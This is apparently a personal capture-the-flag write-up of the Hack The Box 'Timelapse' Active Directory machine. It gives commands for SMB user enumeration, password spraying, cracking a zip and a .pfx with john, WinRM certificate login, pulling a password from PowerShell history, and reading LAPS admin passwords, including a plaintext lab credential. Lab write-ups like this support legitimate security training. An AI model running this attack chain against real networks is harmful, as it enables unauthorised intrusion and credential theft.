---
date: 2026-04-29
tags:
  - htb
  - easy
  - AD
  - pfx
  - ReadLAPSPassword
  - smb
---


# Recon


TCP scan : 

![[Pasted image 20260429141436.png]]






# Exploit


## Port 139 / 445 smb

I can get a list of users on the domain with this command : `nxc smb 10.129.227.113 -u guest -p '' --rid-brute`


![[Pasted image 20260429141850.png]]


I'll extract the users from that output and put them in a users list.

## AS-REP

I tried AS-REP roast but it didn't work.

![[Pasted image 20260429142356.png]]



## user list spray


Because I couldn't find any other entry points, I spray the user list with the user list as the password list

`nxc smb 10.129.227.113 -u users.txt -p users.txt --continue-on-success`

I got a few results : 

![[Pasted image 20260429142518.png]]



## share `shares`

I am able to log in and access the share `Shares`

![[Pasted image 20260429142838.png]]


I find this file in the Dev folder but I can't extract it without a password.

![[Pasted image 20260429143541.png]]


I use fcrackzip to crack the password and the extracted folder gives a .pfx file.

![[Pasted image 20260429143605.png]]

![[Pasted image 20260429143640.png]]



## Crack .pfx



With the  .pfx, we can 
```
pfx2john.py legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash
```

crack lw hash to get the password
```
john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash
```

extract key and certificate
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase: #on peut mettre nimporte quoi, faut 4 caractere
```

extract the rsa key
```
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
```

extract le certificate
```
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

use the key and certificate to connect
```
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

![[Pasted image 20260429162312.png]]



## legacyy

I can connect like so : 
`evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt`


![[Pasted image 20260429144317.png]]






# PrivEsc


## sharphound

I used SharpHound to get the required files to use in BloodHound.

![[Pasted image 20260429150015.png]]


![[Pasted image 20260429150508.png]]


tried to do `CanPSRemote` but it didn't work.


With a hint, I searched the history file and was able to read the password of svc_deploy.

![[Pasted image 20260429152447.png]]



![[Pasted image 20260429155954.png]]


Issue with WinRM. It just hangs.


![[Pasted image 20260429160020.png]]


I had to enable SSL for evil-winrm.

![[Pasted image 20260429160037.png]]



I can privesc by exploiting the fact that the user is part of LAPS_Readers. LAPS is a solution that generates a unique password for local admins. Because we're part of that group, we are able to read it.

![[Pasted image 20260429160116.png]]



## pyLAPS

We can read the password in the terminal with svc_deploy using this command : `Get-ADComputer DC01 -property 'ms-mcs-admpwd'`


I'll also try with this tool called pyLAPS : 
`python pyLAPS.py -a get -d 'timelapse.htb' -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'`

![[Pasted image 20260429160307.png]]



## Adminsitrator


With the admin  password, i can connect to it and access the root file.

![[Pasted image 20260429160608.png]]

![[Pasted image 20260429160628.png]]




